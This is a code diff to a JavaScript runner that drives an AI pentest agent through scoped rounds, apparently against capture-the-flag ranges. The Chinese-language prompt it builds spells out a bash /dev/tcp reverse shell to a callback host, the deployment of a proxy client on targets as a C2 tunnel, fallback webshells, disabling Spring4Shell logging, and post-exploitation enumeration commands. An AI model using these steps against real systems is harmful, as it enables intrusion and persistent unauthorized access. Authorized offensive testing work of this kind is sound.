@@ -3,6 +3,7 @@ import { existsSync, mkdirSync, appendFileSync, writeFileSync } from "node:fs";
 import { resolve, join } from "node:path";
 import os from "node:os";
 import chalk from "chalk";
+import { recommendTargetGuide } from "./target-guides.js";
 
 const PROMPT_FILE = ".pen-agent/prompt.txt";
 const MAX_PROMPT_LEN = 16000;
@@ -38,7 +39,11 @@ export class Runner {
     const logDir = resolve(this.config.workDir, ".pen-agent");
     if (!existsSync(logDir)) mkdirSync(logDir, { recursive: true });
 
-    const promptPath = resolve(this.config.workDir, PROMPT_FILE);
+    const agentDir = this.config.agentWorkDir || this.config.workDir;
+    const agentLogDir = resolve(agentDir, ".pen-agent");
+    if (!existsSync(agentLogDir)) mkdirSync(agentLogDir, { recursive: true });
+
+    const promptPath = resolve(agentDir, PROMPT_FILE);
     writeFileSync(promptPath, prompt, "utf8");
 
     const statusPath = join(logDir, "status.json");
@@ -66,12 +71,13 @@ export class Runner {
 
   _spawn(promptPath, logPath, statusPath, hooks = {}) {
     return new Promise((resolvePromise) => {
+      const agentDir = this.config.agentWorkDir || this.config.workDir;
       const opencodeCmd = process.platform === "win32"
         ? join(process.env.APPDATA || join(os.homedir(), "AppData", "Roaming"), "npm", "node_modules", "opencode-ai", "bin", "opencode.exe")
         : "opencode";
       const args = ["run", "Execute only this round's scoped pentest plan, then stop and hand off.", "--file", promptPath];
       if (this.config.attachUrl) args.push("--attach", this.config.attachUrl);
-      args.push("--dir", this.config.workDir);
+      args.push("--dir", agentDir);
       if (this.config.opencodeAuto) args.push("--auto");
       if (this.config.opencodeModel) args.push("--model", this.config.opencodeModel);
       if (this.config.opencodeAgent) args.push("--agent", this.config.opencodeAgent);
@@ -81,7 +87,7 @@ export class Runner {
       const env = this._buildRunnerEnv();
 
       const child = spawn(opencodeCmd, args, {
-        cwd: this.config.workDir,
+        cwd: agentDir,
         stdio: ["ignore", "pipe", "pipe"],
         shell: false,
         env,
@@ -125,10 +131,15 @@ export class Runner {
       FORCE_COLOR: "0",
       NO_COLOR: "1",
       PEN_AGENT_ARTIFACT_DIR: this.config.artifactDir,
+      PEN_AGENT_WORK_DIR: this.config.agentWorkDir || this.config.workDir,
+      PEN_AGENT_CALLBACK_HOST: this.config.callbackHost || "",
+      PEN_AGENT_PROXY_PORT: String(this.config.proxyPort),
       PEN_AGENT_SCRIPTS_DIR: join(this.config.artifactDir, "scripts"),
       PEN_AGENT_PAYLOADS_DIR: join(this.config.artifactDir, "payloads"),
       PEN_AGENT_DOWNLOADS_DIR: join(this.config.artifactDir, "downloads"),
       PEN_AGENT_NOTES_DIR: join(this.config.artifactDir, "notes"),
+      PEN_AGENT_PROXY_CLIENT_LINUX: join(this.config.artifactDir, "tools", "proxy-client-linux-amd64"),
+      PEN_AGENT_PROXY_CLIENT_WINDOWS: join(this.config.artifactDir, "tools", "proxy-client-windows-amd64.exe"),
     };
 
     if (process.platform === "win32") {
@@ -151,17 +162,30 @@ export class Runner {
   }
 
   _buildPrompt(context) {
-    const missionBrief = this._missionBrief(context);
-    let prompt = missionBrief;
+    const variants = promptVariants(context);
+    let bestPrompt = "";
 
-    if (!context.isFirstRun) {
-      prompt += this._historyBrief(context, missionBrief.length);
+    for (const variant of variants) {
+      const effectiveContext = {
+        ...context,
+        playbookRecommendations: (context.playbookRecommendations || []).slice(0, variant.playbooks),
+        skillRecommendations: (context.skillRecommendations || []).slice(0, variant.skills),
+      };
+      const missionBrief = this._missionBrief(effectiveContext);
+      let prompt = missionBrief;
+
+      if (!effectiveContext.isFirstRun) {
+        prompt += this._historyBrief(effectiveContext, byteLength(missionBrief));
+      }
+
+      if (!bestPrompt || byteLength(prompt) < byteLength(bestPrompt)) bestPrompt = prompt;
+      if (byteLength(prompt) <= MAX_PROMPT_LEN) return prompt;
     }
 
-    if (prompt.length > MAX_PROMPT_LEN) {
-      prompt += `\n\n[warning] Prompt length ${prompt.length} exceeds soft budget ${MAX_PROMPT_LEN}; core mission kept intact. Consider reducing playbook/history verbosity.\n`;
-    }
-    return prompt;
+    return fitText(bestPrompt, MAX_PROMPT_LEN, {
+      keep: "head",
+      marker: "[prompt truncated: hard budget reached after reducing playbooks, skills, and history]",
+    });
   }
 
   _historyBrief(context, missionLength) {
@@ -252,8 +276,22 @@ export class Runner {
     p += "- 如果提前发现 flag 或高危漏洞，可以完成必要取证，但不要因此展开新的大范围任务；把后续动作写入下一轮建议。\n\n";
 
     p += "已获访问后的推进规则（通用，不绑定某个靶场）：\n";
-    p += "- 一旦通过 RCE、webshell、命令执行、SSH、SSRF 回显或类似方式获得入口节点访问，下一阶段必须先做后渗透基础枚举，而不是继续在入口页面重复扫目录或猜参数。\n";
-    p += "- 基础枚举最小集合：id; whoami; hostname; pwd; uname -a; ip addr; ip route; cat /etc/hosts; cat /etc/resolv.conf; env | sort; command -v curl wget nc nmap python3 python bash sh ssh ftp redis-cli smbclient ldapsearch mysql psql。\n";
+    p += "- 一旦通过 RCE、webshell、命令执行、SSH、SSRF 回显或类似方式获得入口节点访问，先稳定当前访问点，但不要为了反连/C2 阻塞基础枚举。\n";
+    p += "- 通用后渗透顺序：\n";
+    p += "  1) 立即确认权限和执行点：id; whoami; hostname; pwd; uname -a。\n";
+    p += "  2) 若入口是 Spring4Shell/AccessLogValve webshell，立刻关闭 AccessLogValve：class.module.classLoader.resources.context.parent.pipeline.first.enabled=false，避免日志继续污染 JSP。\n";
+    p += "  3) 立刻做最小网络枚举并保存证据：ip addr; ip route; cat /etc/hosts; cat /etc/resolv.conf; env | sort; command -v curl wget nc nmap python3 python bash sh ssh ftp redis-cli smbclient ldapsearch mysql psql。\n";
+    p += "  4) 把接口 CIDR、默认路由、DNS search domain、hosts、LAB_ROUTES/ROUTES 等环境变量写入 notes，作为内网扫描范围依据。\n";
+    p += "  5) 基础枚举完成后再尝试持久化通道；持久化失败不能阻止本轮交付内网路由和服务发现证据。\n";
+    if (this.config.callbackHost) {
+      p += `- 回连地址已配置: ${this.config.callbackHost}；反向 shell/C2 只能连接该地址，不要使用 localhost 作为远端回连目标。\n`;
+      p += "- 持久化通道优先级（每类最多尝试 2 次，失败则记录原因并继续）：\n";
+      p += `  1) bash -i >& /dev/tcp/${this.config.callbackHost}/<监听端口> 0>&1 反向 shell（如果目标有 bash 且 /dev/tcp 可用）。\n`;
+      p += `  2) 下载 proxy-client 到目标 /tmp/ 并启动，连接 ${this.config.callbackHost}:${this.config.proxyPort} 建立 C2 隧道。\n`;
+      p += "  3) 如果以上均失败，写入备用 webshell（不同文件名、不同路径）作为下一轮 fallback。\n";
+    } else {
+      p += "- 当前未配置 PEN_AGENT_CALLBACK_HOST/--callback-host；不要编造反连地址，不要让目标连接 localhost。可先完成基础枚举、服务发现和备用 webshell，汇总中明确需要 callback host 后再尝试 C2。\n";
+    }
     p += "- 内网扫描范围只能从实际证据推导：接口 CIDR、路由表、hosts、DNS search domain、应用配置、源码、下载文件、页面泄露和已验证服务返回；不要写死某个靶场的 IP 段。\n";
     p += "- 使用已控入口节点作为观测点做小范围服务验证，优先端口：80,443,8080,8000,8009,8983,3000,5000,5984,6379,21,22,139,389,445,3306,5432,9000,9001。\n";
     p += "- 服务发现阶段只确认连通性、banner、状态码、版本、认证状态和最小页面证据；除非本轮计划要求利用，否则不要把所有发现的服务在同一轮全部打穿。\n";
@@ -285,6 +323,14 @@ export class Runner {
       p += "- skill 只提供打法参考，仍必须以当前靶场证据和授权边界为准，不得跳过证据链直接套用结论。\n\n";
     }
 
+    const targetGuide = recommendTargetGuide(this.config, context);
+    if (targetGuide) {
+      p += `靶场打法引导（${targetGuide.id}）：\n`;
+      p += `- ${targetGuide.title}\n`;
+      for (const item of targetGuide.body || []) p += `- ${item}\n`;
+      p += "- 该引导只在当前远程证据匹配时使用；若证据不匹配，以实际响应和授权边界为准。\n\n";
+    }
+
     p += "产物目录要求（强制）：\n";
     p += `- 所有中间文件、Python 脚本、payload、webshell、上传样本、下载结果、字典、扫描结果、笔记都必须放在: ${this.config.artifactDir}\n`;
     p += `- Python/脚本放入: ${scriptsDir}\n`;
@@ -302,6 +348,10 @@ export class Runner {
     p += "- 编写脚本时必须记录：文件路径、代码用途、关键逻辑、运行命令、输出结果、失败修正。\n";
     p += "- 可以输出详细的思路摘要、判断依据和计划，但必须基于命令输出、响应内容、状态码、页面差异、文件内容等可观察证据，不要编造不可验证内容。\n";
     p += "- 保留关键证据片段：URL、参数、状态码、响应差异、命令输出摘要、上传路径、会话信息、凭据、回连地址、flag。\n\n";
+
+    p += "有效 flag 证据规则（强制）：\n";
+    p += "- 只有来自授权目标 HTTP 响应、目标 RCE/webshell/SSH/C2 输出、目标服务协议客户端输出的 flag 才算有效。\n";
+    p += "- 总结每个 flag 时必须写明远程证据命令或 HTTP 请求；没有远程证据命令的 flag 视为无效。\n\n";
 
     p += "本轮停止标准：\n";
     p += "- 达成本轮计划列出的目标后必须停止，并输出【本轮汇总】、【证据清单】、【问题与修正】、【下一轮建议】、【奖励评估】、【本轮停止】。\n";
@@ -328,8 +378,12 @@ export class Runner {
     p += "- runner 已为 macOS/Linux/Windows 补齐常见工具 PATH，并在 POSIX 系统上优先使用 bash/sh；命令中不要重新赋值 PATH/path，也不要在循环中使用 path 作为变量名。\n";
     p += "- 循环变量请使用 item、target_path、route、name 等；如果出现 curl/nmap/python 间歇性 command not found，优先检查当前命令是否覆盖了 PATH/path，并用 command -v 复核工具位置。\n";
     p += "- 横向代理服务已启动时可使用，但只在本轮计划允许时使用。\n";
-    p += `- 代理服务端: localhost:${this.config.proxyPort}\n`;
+    p += `- 代理服务端监听本机: 0.0.0.0:${this.config.proxyPort}\n`;
+    p += `- 目标回连地址: ${this.config.callbackHost || "未配置；不要使用 localhost 作为目标回连地址"}\n`;
     p += `- 工具产物环境变量: PEN_AGENT_ARTIFACT_DIR=${this.config.artifactDir}\n`;
+    p += `- 回连环境变量: PEN_AGENT_CALLBACK_HOST=${this.config.callbackHost || ""}\n`;
+    p += `- Linux proxy-client 可用路径: ${join(this.config.artifactDir, "tools", "proxy-client-linux-amd64")}\n`;
+    p += `- Windows proxy-client 可用路径: ${join(this.config.artifactDir, "tools", "proxy-client-windows-amd64.exe")}\n`;
     return p;
   }
 }
@@ -353,20 +407,78 @@ function pickExistingShell(candidates, fallback) {
   return fallback || "/bin/sh";
 }
 
+function promptVariants(context = {}) {
+  const playbookCount = context.playbookRecommendations?.length || 0;
+  const skillCount = context.skillRecommendations?.length || 0;
+  const playbookLimits = uniqueDescending([
+    playbookCount,
+    Math.min(playbookCount, 5),
+    Math.min(playbookCount, 3),
+    Math.min(playbookCount, 1),
+    0,
+  ]);
+  const skillLimits = uniqueDescending([
+    skillCount,
+    Math.min(skillCount, 3),
+    Math.min(skillCount, 1),
+    0,
+  ]);
+
+  const variants = [];
+  for (const playbooks of playbookLimits) {
+    for (const skills of skillLimits) {
+      variants.push({ playbooks, skills });
+    }
+  }
+  return variants;
+}
+
+function uniqueDescending(values) {
+  return [...new Set(values.filter((value) => Number.isInteger(value) && value >= 0))]
+    .sort((a, b) => b - a);
+}
+
 function fitText(value, maxLength, options = {}) {
   const text = String(value || "");
-  if (text.length <= maxLength) return text;
+  if (byteLength(text) <= maxLength) return text;
 
   const marker = options.marker || "[truncated]";
   const markerBlock = `${marker}\n`;
-  const budget = Math.max(0, maxLength - markerBlock.length);
+  const budget = Math.max(0, maxLength - byteLength(markerBlock));
   if (budget <= 0) return marker;
 
   if (options.keep === "tail") {
-    return markerBlock + trimToLineBoundary(text.slice(-budget), "start");
+    return markerBlock + trimToLineBoundary(takeBytes(text, budget, "tail"), "start");
   }
 
-  return trimToLineBoundary(text.slice(0, budget), "end") + `\n${marker}`;
+  return trimToLineBoundary(takeBytes(text, budget, "head"), "end") + `\n${marker}`;
+}
+
+function byteLength(value) {
+  return Buffer.byteLength(String(value || ""), "utf8");
+}
+
+function takeBytes(text, maxBytes, keep) {
+  const chars = Array.from(String(text || ""));
+  let low = 0;
+  let high = chars.length;
+  let best = "";
+
+  while (low <= high) {
+    const mid = Math.floor((low + high) / 2);
+    const candidate = keep === "tail"
+      ? chars.slice(chars.length - mid).join("")
+      : chars.slice(0, mid).join("");
+
+    if (byteLength(candidate) <= maxBytes) {
+      best = candidate;
+      low = mid + 1;
+    } else {
+      high = mid - 1;
+    }
+  }
+
+  return best;
 }
 
 function trimToLineBoundary(text, side) {
